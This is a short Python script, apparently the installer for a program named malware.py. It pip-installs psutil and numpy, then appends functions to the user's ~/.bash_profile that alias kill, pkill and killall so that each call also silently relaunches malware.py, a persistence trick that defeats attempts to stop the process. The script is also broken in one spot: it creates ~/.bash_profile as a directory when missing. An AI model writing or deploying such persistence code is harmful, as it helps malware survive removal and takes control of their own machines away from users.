
import os

import subprocess

bashCommand = "pip3 install psutil"
process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
output, error = process.communicate()

bashCommand = "pip3 install numpy"
process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
output, error = process.communicate()


if not ".bash_profile" in os.listdir(os.path.expanduser("~/.")):
    os.mkdir(os.path.expanduser("~/.bash_profile"))

file_path = os.path.realpath("./malware.py")
textappend = '''
function mykill() {
    kill $@
    python filepath > /dev/null 2>&1
}
function mypkill() {
    pkill $@
    python filepath > /dev/null 2>&1
}
function mykilllall() {
    killall $@
    python filepath > /dev/null 2>&1
}
alias kill="mykill" 
alias pkill="mypkill" 
alias killall="mykilllall" 
'''

textappend = textappend.replace("filepath",file_path)


with open(os.path.expanduser("~/.bash_profile"), "a") as file_object:
    file_object.write(textappend)